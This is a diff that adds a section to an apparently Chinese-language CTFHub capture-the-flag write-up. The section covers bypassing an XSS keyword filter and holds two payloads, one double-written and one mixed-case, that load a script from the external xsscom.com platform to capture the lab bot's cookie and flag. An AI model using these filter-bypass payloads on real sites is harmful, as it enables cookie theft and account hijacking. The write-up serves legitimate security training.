@@ -1320,3 +1320,24 @@ ctfhub{f90b6c76f97124cd83e38e9b}
 
 ------
 
+#### 过滤关键词
+
+利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。
+
+发现关键词`script`被过滤了，我们可以通过以下俩种方式绕过关键词过滤：
+
+- 双写绕过：
+
+  ```html
+  </textarea>'"><scrscriptipt src=http://xsscom.com//purFOq></scrscriptipt>
+  ```
+
+- 大小写绕过：
+
+  ```html
+  </textarea>'"><Script src=http://xsscom.com//purFOq></sCript>
+  ```
+
+在接收到的内容中能看到`cookie : flag=ctfhub{4b7f4238db209b657b3ff69f}`，提交即可。
+
+------
